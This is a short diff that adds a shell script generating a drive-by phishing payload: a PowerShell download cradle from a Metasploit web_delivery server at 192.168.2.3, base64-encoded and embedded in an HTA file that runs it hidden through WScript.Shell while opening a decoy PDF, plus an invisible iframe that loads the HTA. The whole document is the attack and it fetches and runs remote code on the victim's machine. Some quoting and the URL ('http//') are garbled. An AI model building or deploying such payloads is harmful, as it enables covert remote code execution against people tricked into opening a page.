@@ -1,0 +1,7 @@
+# Set DownLoadString from exploit/multi/script/web_delivery 
+ps=”iex (New-Object Net.WebClient).DownloadString(‘http//192.168.2.3/InHFgoM77v6ck’)” encode=”`echo $ps | iconv –to-code UTF-16LE | base64 -w 0`” 
+echo -e “####HTA FILE####\n” echo “<script>” 
+echo ‘a=new ActiveXObject(“WScript.Shell”);’ 
+echo “a.run(‘%windir%\\\\System32\\\\cmd.exe /c powershell.exe -nop -w hidden -enc $encode’);” echo ‘a.run(“http://www.companyname.com/legit.pdf”)’; 
+echo “window.close();” echo “</script>” echo -e “\n ####IFRAME####\n” 
+echo ‘<iframe id=”frame” src=”CHANGEME.hta” application=”yes” width=0 height=0 style=”hidden” frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>
